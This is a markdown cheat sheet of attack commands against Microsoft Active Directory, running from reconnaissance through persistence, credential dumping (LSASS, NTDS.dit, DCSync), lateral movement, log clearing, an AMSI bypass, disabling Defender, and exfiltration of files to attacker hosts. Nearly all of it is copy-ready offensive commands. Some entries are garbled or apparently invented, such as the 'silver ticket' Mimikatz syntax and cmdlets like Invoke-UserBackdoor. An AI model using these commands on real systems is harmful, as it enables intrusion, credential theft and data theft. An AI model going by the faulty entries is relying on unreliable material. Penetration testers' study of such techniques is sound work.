# Index
- [[Microsoft Active Directory (AD)]]
	- [[Active Directory Cheat Sheet]]
	- [[Kerberos Cheat Sheet]]
	- [[LDAP Cheat Sheet]]
	- [[MSSQL Cheat Sheet]]
	- [[PowerShell Active Directory Cheat Sheet]]

# 1. External Reconnaissance 

#### 1.1 Enumerate Domain Controllers 

- **nmap**:
    
    ```bash
    nmap -p <target_port> --script "ldap*,smb*,msrpc*,krb5-enum-users" -v -oA ldap-enum <target_ip>
    ```
    
- **rpcclient**:
    
    ```bash
    rpcclient -U "" <target_ip>
    ```
    

#### 1.2 Enumerate Domain Information 

- **netdiscover (for Windows)**:
    
    ```bash
    netdiscover -r <target_ip_range>
    ```
    
- **ldapsearch (Linux)**:
    
    ```bash
    ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com"
    ```
    
- **PowerView (Windows)**:
    
    ```powershell
    Import-Module PowerView
    Get-NetDomain
    Get-NetDomainController
    ```
    

#### 1.3 Gather Domain User Information 

- **rpcclient**:
    
    ```bash
    rpcclient -U "" <target_ip> -c "enumdomusers"
    ```
    
- **CrackMapExec (CME)**:
    
    ```bash
    cme smb <target_ip> -u '' -p '' --users
    ```
    
- **BloodHound**:
    
    ```powershell
    Import-Module SharpHound
    Invoke-BloodHound -CollectionMethod All
    ```
    

#### 1.4 Enumerate GPOs (Group Policy Objects) 

- **PowerView**:
    
    ```powershell
    Get-NetGPO
    Get-NetGPO | %{Get-ObjectACL -DistinguishedName $_.distinguishedname -ResolveGUIDs}
    ```
    
- **GPOTool**:
    
    ```bash
    gpotool /dc:<target_domain_controller>
    ```
    

#### 1.5 Enumerate Active Sessions 

- **Logged On Users (PowerView)**:
    
    ```powershell
    Get-NetLoggedon -ComputerName <target_ip>
    ```
    
- **NetSessionEnum**:
    
    ```bash
    net session \\<target_ip>
    ```
    

**1.6 Enumerate Installed Software**:

- **PowerUp**:
    
    ```powershell
    Get-RemoteProgram -ComputerName <target_ip>
    ```
    
- **WMIC**:
    
    ```bash
    wmic /node:<target_ip> product get name, version
    ```
    

#### 1.6 Enumerate Local Admins 

- **PowerView**:
    
    ```powershell
    Get-NetLocalGroup -ComputerName <target_ip> -GroupName Administrators
    ```
    
- **CrackMapExec (CME)**:
    
    ```bash
    cme smb <target_ip> -u <username> -p <password> --local-admins
    ```
    

#### 1.7 Enumerate Domain Admins 

- **PowerView**:
    
    ```powershell
    Get-NetGroupMember -GroupName "Domain Admins"
    ```
    

#### 1.8 Enumerate Shares 

- **CrackMapExec (CME)**:
    
    ```bash
    cme smb <target_ip> -u <username> -p <password> --shares
    ```
    
- **SMBClient**:
    
    ```bash
    smbclient -L //<target_ip> -U <username>
    ```
    

#### 1.9 Enumerate DNS Records 

- **dnscmd (Windows)**:
    
    ```powershell
    dnscmd <target_ip> /enumrecords <zone_name> /type A
    ```
    
- **dnsrecon (Linux)**:
    
    ```bash
    dnsrecon -d <domain> -t axfr
    ```
    

#### 1.10 Enumerate Kerberos Tickets 

- **Rubeus**:
    
    ```powershell
    Rubeus.exe dump
    ```
    

#### 1.11 Enumerate AD Trusts 

- **PowerView**:
    
    ```powershell
    Get-NetDomainTrust
    ```
    

#### 1.12 Enumerate LAPS (Local Administrator Password Solution) 

- **Get-LAPS**:
    
    ```powershell
    Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd
    ```
    

# 2. Initial Access 

# 3. Persistence 

#### 3.1 Golden Ticket Attack 

- **Mimikatz**:
    
    ```powershell
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
    ```
    

#### 3.2 Silver Ticket Attack 

- **Mimikatz**:
    
    ```powershell
    tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM hash> /user:<username> /service:krbtgt
    ```
    

#### 3.3 Skeleton Key Attack 

- **Mimikatz**:
    
    ```powershell
    privilege::debug
    misc::skeleton
    ```
    

#### 3.4 Backdooring User Accounts 

- **Invoke-UserBackdoor**:
    
    ```powershell
    Invoke-UserBackdoor -UserName <username> -NewPass <password>
    ```
    

#### 3.5 Backdoor Accounts via ACLs 

- **Set DACL to Grant Attacker Control**:
    
    ```powershell
    Add-DomainObjectAcl -TargetIdentity <target_account> -PrincipalIdentity <attacker_user> -Rights All
    ```
    

#### 3.6 Persistence via Malicious GPOs 

- **Deploy Malicious GPO**:
    
    ```powershell
    Invoke-GPOInstall -Path \\<domain>\SYSVOL\<domain>\Policies\{GPO_GUID}\Machine\Scripts\Startup
    ```
    

# 4. Credential Harvesting 

#### 4.1 Brute Forcing 

- **THC-Hydra**:
    
    ```bash
    hydra -l <username> -P /path/to/passwords.txt smb://<target_ip>
    ```
    

#### 4.2 Password Spraying 

- **CrackMapExec (CME)**:
    
    ```bash
    cme smb <target_ip_range> -u username_list.txt -p password
    ```
    
- **Kerbrute (for Kerberos)**:
    
    ```bash
    ./kerbrute -domain domain.com -users users.txt -passwords passwords.txt -threads 5
    ```
    

#### 4.3 Extract Password Hashes 

- **SecretsDump (Impacket)**:
    
    ```bash
    secretsdump.py <domain>/<username>:<password>@<target_ip>
    ```
    
- **Mimikatz (Windows)**:
    
    ```powershell
    mimikatz # sekurlsa::logonpasswords
    ```
    

#### 4.4 Dump Credentials from LSASS 

- **Mimikatz**:
    
    ```powershell
    sekurlsa::logonpasswords
    ```
    
- **Procdump (Windows)**:
    
    ```bash
    procdump64.exe -ma lsass.exe lsass.dmp
    ```
    

#### 4.5 Dump Cached Credentials 

- **Mimikatz**:
    
    ```powershell
    sekurlsa::logonpasswords /patch
    ```
    

#### 4.6 Dump NTDS.dit 

- **ntdsutil (Windows)**:
    
    ```bash
    ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
    ```
    
- **Impacket's secretsdump**:
    
    ```bash
    secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
    ```
    

# 5. Privilege Escalation 

#### 5.1 Pass-the-Hash Attack 

- **Pass-the-Hash with Mimikatz**:
    
    ```powershell
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe
    ```
    

#### 5.2 Kerberoasting 

- **Invoke-Kerberoast**:
    
    ```powershell
    Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
    ```
    
- **Rubeus**:
    
    ```powershell
    Rubeus.exe kerberoast
    ```
    
- **Request and Crack Service Tickets**:
    
    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    hashcat -m 13100 <hash> /path/to/wordlist.txt
    ```
    

#### 5.3 Abusing GPOs (Group Policy Objects) 

- **SharpGPOAbuse**:
    
    ```powershell
    SharpGPOAbuse -AddUserToLocalGroup -UserAccount your_user -GroupName "Administrators" -GPOName "Default Domain Policy"
    ```
    

#### 5.4 Abusing Group Policy Preferences (GPP) 

- **gpp-decrypt (Linux)**:
    
    ```bash
    gpp-decrypt <cpassword>
    ```
    
    Decrypting passwords stored in GPP.

#### 5.5 DCSync Attack (Replicating Directory) 

- **Mimikatz**:
    
    ```powershell
    lsadump::dcsync /user:<domain>\<username>
    ```
    
- **Impacket’s secretsdump.py**:
    
    ```bash
    secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
    ```
    

#### 5.6 Exploiting Misconfigured Services 

- **PowerUp (Windows)**:
    
    ```powershell
    Import-Module PowerUp
    Invoke-AllChecks
    ```
    

#### 5.7 Abusing Unconstrained Delegation 

- **Mimikatz (Windows)**:
    
    ```powershell
    mimikatz # sekurlsa::tickets
    ```
    
- **Impacket’s GetUserSPNs.py**:
    
    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    ```
    

#### 5.8 Abusing TrustedForDelegation Privilege 

- **PowerView**:
    
    ```powershell
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth
    ```
    

#### 5.9 Token Impersonation (Windows) 

- **Incognito (Windows)**:
    
    ```powershell
    token::elevate
    ```
    

#### 5.10 Abusing Service Accounts 

- **Kerberoasting with Rubeus**:
    
    ```powershell
    Rubeus.exe kerberoast
    ```
    
    Crack the ticket with Hashcat:
    
    ```bash
    hashcat -m 13100 <ticket_hash> /path/to/wordlist.txt
    ```
    

#### 5.11 Abusing DNSAdmins 

- **Abuse DNSAdmin Privilege**: Load malicious DLL via DNSAdmins privilege.
    
    ```powershell
    dnscmd <target_ip> /config /serverlevelplugindll \\<attacker_ip>\share\dll
    ```
    

#### 5.12 Abusing Passwords in SYSVOL 

- **GPP Password Decryption**:
    
    ```bash
    gpp-decrypt <cpassword>
    ```
    

#### 5.13 Exploiting Weak ACLs 

- **Abuse WriteDACL Permissions**:
    
    ```powershell
    Add-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <attacker_user> -Rights DCSync
    ```
    

# 6. Internal Reconnaissance 

#### 6.1 Data Extraction 

- **SharpHound (BloodHound)**:
    
    ```powershell
    Invoke-BloodHound -CollectionMethod All
    ```
    

#### 6.2 Sensitive File Searching 

- **Invoke-FileFinder**:
    
    ```powershell
    Invoke-FileFinder -SearchWordList passwords.txt
    ```
    

# 7. Lateral Movement, Pivoting, and Tunnelling 

#### 7.1 Pass-the-Hash (PtH) 

- **Impacket’s WMIExec**:
    
    ```bash
    wmiexec.py <domain>/<username>:<NTLM_hash>@<target_ip>
    ```
    
- **Evil-WinRM**:
    
    ```bash
    evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
    ```
    

#### 7.2 Overpass-the-Hash (Pass-the-Key) 

- **Mimikatz**:
    
    ```powershell
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /rc4:<NTLM_hash> /run:cmd.exe
    ```
    

#### 7.3 Pass-the-Ticket (PTT) Attack 

- **Mimikatz**:
    
    ```powershell
    kerberos::ptt <ticket.kirbi>
    ```
    
    Use this command after extracting a TGT or TGS ticket to impersonate a user on the domain.

#### 7.4 Lateral Movement via SSH 

- **SSHPass (Linux)**:
    
    ```bash
    sshpass -p <password> ssh <username>@<target_ip>
    ```
    

#### 7.5 Remote Desktop Protocol (RDP) 

- **rdesktop**:
    
    ```bash
    rdesktop -u <username> -p <password> <target_ip>
    ```
    
- **xfreerdp (Linux)**:
    
    ```bash
    xfreerdp /u:<username> /p:<password> /v:<target_ip>
    ```
    

#### 7.6 Lateral Movement via SMB 

- **CrackMapExec (CME)**:
    
    ```bash
    cme smb <target_ip> -u <username> -H <NTLM_hash> -x <command>
    ```
    
- **PsExec (Impacket)**:
    
    ```bash
    psexec.py <domain>/<username>:<password>@<target_ip> cmd.exe
    ```
    

#### 7.7 Lateral Movement via PSExec 

- **PsExec**:
    
    ```bash
    psexec.py <domain>/<username>:<password>@<target_ip>
    ```
    

#### 7.8 Lateral Movement via WMIExec 

- **WMIExec (Impacket)**:
    
    ```bash
    wmiexec.py <domain>/<username>:<password>@<target_ip>
    ```
    
- **Invoke-WmiMethod (PowerShell)**:
    
    ```powershell
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>" -ComputerName <target_ip>
    ```
    

#### 7.9 Lateral Movement via DCOM 

- **Invoke-DCOM (PowerShell)**:
    
    ```powershell
    Invoke-DCOM -ComputerName <target_ip> -Method ShellExecute -Command "powershell.exe"
    ```
    

#### 7.10 SMB Relay Attack 

- **Impacket’s ntlmrelayx**:
    
    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    ```
    

# 8. Defense Evasion 

#### 8.1 Clearing Event Logs 

- **Wevtutil**:
    
    ```powershell
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    ```
    

#### 8.2 Disabling Security Tools 

- **Invoke-Obfuscation (PowerShell)**:
    
    ```powershell
    Invoke-Obfuscation -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
    ```
    

#### 8.3 Process Injection 

- **Invoke-ReflectivePEInjection**:
    
    ```powershell
    Invoke-ReflectivePEInjection -PEBytes (Get-Content calc.exe -Raw) -ProcID <PID>
    ```
    

#### 8.4 UAC Bypass 

- **UACMe**:
    
    ```powershell
    .\uacme.exe
    ```
    

#### 8.5 Bypass PowerShell Script Block Logging 

- **Obfuscate PowerShell Scripts**:
    
    ```powershell
    Invoke-Obfuscation
    ```
    

#### 8.6 Bypass AMSI (Antimalware Scan Interface) 

- **AMSI Bypass in PowerShell**:
    
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    ```
    

#### 8.7 Evade UAC (User Account Control) 

- **UACMe (Windows)**:
    
    ```powershell
    .\uacme.exe
    ```
    

#### 8.8 Bypass Network Access Controls 

- **Pivoting with SSH Tunnels**:
    
    ```bash
    ssh -L <local_port>:<target_ip>:<target_port> <attacker_ip>
    ```
    
- **VPN Pivoting**:
    
    ```bash
    openvpn --config <vpn_config.ovpn>
    ```
    

# 9. Data Exfiltration 

#### 9.1 Data Exfiltration via HTTPS 

- **Invoke-WebRequest (PowerShell)**:
    
    ```powershell
    $data = Get-Content C:\SensitiveData.txt
    Invoke-WebRequest -Uri https://<attacker_server>/upload -Method POST -Body $data
    ```
    

#### 9.2 Exfiltration via DNS 

- **DnsExfiltrator**:
    
    ```bash
    dnsexfiltrator -i ens33 -d attacker.com -f /etc/passwd
    ```
    
- **Dnscat2**:
    
    ```bash
    dnscat2-client <target_domain>
    ```
    

#### 9.3 Exfiltration via SMB** 

- **SMBClient**:
    
    ```bash
    smbclient //target/share -U <username> -c 'prompt off; mget *'
    ```
    

#### 9.4 Data Exfiltration via ICMP 

- **PowerShell (Invoke-PingExfil)**:
    
    ```powershell
    Invoke-PingExfil -FilePath C:\sensitive_data.txt -DestinationIP <attacker_ip>
    ```
    

#### 9.4 Exfiltration via Rclone 

- **Exfil with Rclone**:
    
    ```bash
    rclone copy /path/to/data remote:bucket
    ```
    

# 10. Reporting and Cleanup 

#### 10.1 Generate Comprehensive Report 

- **Dradis Framework**:
    
    ```bash
    dradis
    ```
    
    Useful for organizing findings and generating reports.

#### 10.2 Remove Tools and Artifacts 

- **PowerShell**:
    
    ```powershell
    Remove-Item -Path C:\Temp\* -Recurse
    Clear-History
    ```
    

#### 10.3 Reset Permissions 

- **PowerView**:
    
    ```powershell
    Invoke-ACLReset -Path "CN=AdminSDHolder,CN=System,DC=domain,DC=com"
    ```
    

#### 10.4 Log Out and End Session 

- **PowerShell**:
    
    ```powershell
    Stop-Process -Name explorer
    ```
    

# 11. Attack Techniques on Specific AD Services 

## 11.2 LDAP 

#### 11.1.1 LDAP (Lightweight Directory Access Protocol) 

- **ldapsearch**:
    
    ```bash
    ldapsearch -x -H ldap://<target_ip> -b "dc=domain,dc=com"
    ```
    
- **CrackMapExec (CME)**:
    
    ```bash
    cme ldap <target_ip> -u <username> -p <password> -M ldap_search -o "base=DC=domain,DC=com"
    ```
    

## 11.2 SMB 

#### 11.2.1 SMB (Server Message Block) 

- **EternalBlue Exploit (Metasploit)**:
    
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <target_ip>
    run
    ```
    

## 11.3 RPC 

#### 11.3.1 RPC (Remote Procedure Call) 

- **rpcclient**:
    
    ```bash
    rpcclient -U "<username>%<password>" <target_ip> -c "enumdomusers"
    ```
    

## 11.4 MSSQL 

#### 11.4.1 MSSQL Server 

- **SQLCMD (Linux)**:
    
    ```bash
    sqlcmd -S <target_ip> -U <username> -P <password>
    ```
    
- **CrackMapExec (CME)**:
    
    ```bash
    cme mssql <target_ip> -u <username> -p <password> --xp_cmdshell
    ```
    

## 11.5 RPD 

#### 11.5.1 RDP (Remote Desktop Protocol) 

- **RDP Client (Linux)**:
    
    ```bash
    rdesktop -u <username> -p <password> <target_ip>
    ```
    
- **CrackMapExec (CME)**:
    
    ```bash
    cme rdp <target_ip> -u <username> -p <password> --exec "powershell.exe"
    ```
    

## 11.6 Kerberos 

#### 11.6.1 Kerberos Service Ticket Enumeration 

- **GetUserSPNs (Impacket)**:
    
    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    ```
    

#### 11.6.2 AS-REP Roasting 

- **Rubeus**:
    
    ```powershell
    Rubeus.exe asreproast /user:<username>
    ```
    
    Crack with Hashcat:
    
    ```bash
    hashcat -m 18200 <asrep_hash> /path/to/wordlist.txt
    ```
    

#### 11.6.3 Constrained Delegation Abuse 

- **PowerView**:
    
    ```powershell
    Get-DomainUser -TrustedToAuth
    Set-DomainObject -Identity "<computer_account>" -Set @{msDS-AllowedToDelegateTo="HOST/<target_service>"}
    ```
    
- **S4U2Self Attack (Rubeus)**:
    
    ```powershell
    Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<target_service>
    ```
    

#### 11.6.4 Kerberos Unconstrained Delegation 

- **Rubeus**:
    
    ```powershell
    Rubeus.exe tgtdeleg /target:<target_computer>
    ```
    

# 12. Domain Trust Exploitation 

#### 12.1 Enumerating Trusts 

- **PowerView**:
    
    ```powershell
    Get-NetForest
    Get-NetForestDomain
    Get-NetDomainTrust
    Get-NetForestTrust
    ```
    

#### 12.2 Exploiting Inter-Trust Relationships 

- **ADExplorer**: Enumerate trust relationships and attack via SID History.
- **BloodHound**:
    
    ```powershell
    Invoke-BloodHound -CollectionMethod Trusts
    ```
    

#### 12.3 Abusing SID History 

- **Mimikatz**:
    
    ```powershell
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID>-500 /sids:<target_domain_SID>-519 /krbtgt:<NTLM_hash> /target:<target_domain> /rc4:<NTLM_hash>
    ```
    

# 13. Domain Persistence Techniques 

#### 13.1 Persistence via AdminSDHolder 

- **PowerView**:
    
    ```powershell
    Set-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Set @{msds-allowedtoactonbehalfofotheridentity=Get-ACL}
    ```
    

#### 13.2 Persistence via SID History 

- **Invoke-SIDHistoryInjection**:
    
    ```powershell
    Invoke-SIDHistoryInjection -UserName <target_user> -SIDHistory <SID_to_inject>
    ```
    

#### 13.3 Backdooring Accounts via ACLs 

- **PowerView**:
    
    ```powershell
    Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <AttackerUser> -Rights DCSync
    ```
    

#### 13.4 ACL Abuse for Persistence 

- **Aclpwn.py**:
    
    ```bash
    aclpwn --domain <domain> --username <username> --password <password> --command-backdoor --target <target_user>
    ```